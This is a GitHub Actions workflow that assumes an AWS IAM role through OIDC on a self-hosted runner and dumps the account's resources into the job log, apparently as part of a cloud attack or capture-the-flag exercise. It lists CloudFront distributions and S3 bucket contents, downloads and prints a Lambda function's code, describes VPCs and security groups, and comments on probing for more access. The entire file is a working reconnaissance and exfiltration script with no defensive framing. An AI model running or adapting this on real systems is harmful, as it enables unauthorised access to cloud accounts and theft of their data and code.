name: corgi-assume
on:
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  dump:
    runs-on: self-hosted
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1
          role-session-name: cloudescape-corgi
      - name: Dump CF site objects and try lambda code
        run: |
          set +e
          echo "=== CF list ==="
          aws cloudfront list-distributions --output json | tee /tmp/cf.json
          echo "=== CF get EKD9KH16RB5G3 ==="
          aws cloudfront get-distribution --id EKD9KH16RB5G3 --output json | tee /tmp/cf1.json
          echo "=== platform list ==="
          aws s3 ls s3://platform-bucket-009661764077-us-east-1 --recursive
          aws s3api list-objects-v2 --bucket platform-bucket-009661764077-us-east-1
          echo "=== site list ==="
          aws s3 ls s3://site781fe43f26b9eba3 --recursive
          aws s3api list-objects-v2 --bucket site781fe43f26b9eba3
          echo "=== codec list ==="
          aws s3api list-objects-v2 --bucket codec4f26c862a321ef5
          echo "=== lambda get-function location, download code ==="
          URL=$(aws lambda get-function --function-name nslookupv2 --query 'Code.Location' --output text)
          echo "URL=$URL"
          curl -sL "$URL" -o /tmp/lam.zip
          ls -la /tmp/lam.zip
          unzip -l /tmp/lam.zip || true
          unzip -p /tmp/lam.zip || true
          echo "=== describe vpcs/subnets ==="
          aws ec2 describe-vpcs --output json | head -c 20000
          aws ec2 describe-security-groups --group-ids sg-0de9d1a2c42a08a3e --output json 2>&1 | head -c 10000
          echo "=== try get more apigw via get-policy only already have 3q931syi7b ==="
          # try s3 get with requester pays etc
          aws s3api get-object --bucket platform-bucket-009661764077-us-east-1 --key anything /tmp/x 2>&1 | head